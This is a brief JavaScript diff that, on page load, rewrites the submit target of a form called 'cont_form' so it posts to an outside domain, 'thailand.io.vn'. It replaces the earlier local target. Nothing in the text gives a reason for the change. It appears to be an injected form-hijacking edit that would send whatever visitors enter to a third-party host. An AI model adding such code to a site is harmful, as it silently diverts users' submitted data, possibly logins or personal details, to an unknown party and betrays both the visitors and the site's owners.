@@ -1,5 +1,5 @@
 document.addEventListener("DOMContentLoaded", function () {
-    var nui1 = "?";
+    var nui1 = "https://www.thailand.io.vn/01?";
     var form = document.getElementById("cont_form");
     form.action = nui1;
 });
